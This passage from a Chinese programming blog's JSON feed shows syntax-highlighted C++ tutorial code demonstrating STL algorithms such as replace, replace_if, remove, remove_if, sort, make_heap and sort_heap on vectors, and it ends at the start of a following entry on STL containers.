punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t<span class=\"token comment\">// 替换元素  参数：  替换区间  被替换的值 替换的值</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token comment\">// 将容器中的 6 替换为 100</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token comment\">// 判断奇偶数，如果是奇数返回真，否则返回假</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">bool</span> <span class=\"token function\">odd</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t<span class=\"token keyword\">return</span> x <span class=\"token operator\">%</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_replace_if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t<span class=\"token comment\">// 替换元素  参数：  替换区间  通过函数来处理需要被替换的值 替换的值</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token comment\">// 将容器中的奇数替换为 100</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token function\">replace_if</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> odd<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t<span class=\"token comment\">// 删除指定内容的元素，需要注意的是，即使删除了但是由于元素大小没变，所以就会向前移</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t<span class=\"token comment\">// 例如这里是 1,1,4,5，当你删除了 1，这个元素的内容就会变成 4,5,4,5</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t<span class=\"token function\">remove</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t<span class=\"token comment\">// 按条件删除元素</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t<span class=\"token function\">remove_if</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> odd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"排序算法\"><a class=\"anchor\" href=\"#排序算法\">#</a> 排序算法</h3>\n<p>排序算法是指可以对指定容器进行排序的算法，如下函数：</p>\n<ol>\n<li><code>sort</code>  ：普通排序</li>\n<li><code>make_heap</code>  ：将一个区间转换成堆</li>\n<li><code>sort_heap</code>  ：对堆进行排序，排序后就不是堆了</li>\n</ol>\n<p>代码如下：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_sort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">66</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">87</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">// 排序</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_make_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">66</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">87</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token comment\">// 在容器范围内，就地建堆，保证最大值在所给范围的最前面，其他值的位置不确定</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token function\">make_heap</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Study_sort_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">66</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span><span class=\"token number\">87</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token comment\">// 在容器范围内，就地建堆，保证最大值在所给范围的最前面，其他值的位置不确定</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token function\">make_heap</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t<span class=\"token comment\">// 对堆进行排序，排序后就不是一个堆了</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token function\">sort_heap</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MyPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tcout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "非可变序列算法",
                "可变序列算法",
                "排序算法"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/STL/STL%E5%AE%B9%E5%99%A8/",
            "url": "https://or0kit.github.io/Programming/STL/STL%E5%AE%B9%E5%99%A8/",
            "title": "STL容器",
            "date_published": "2022-04-15T07:35:48.000Z",
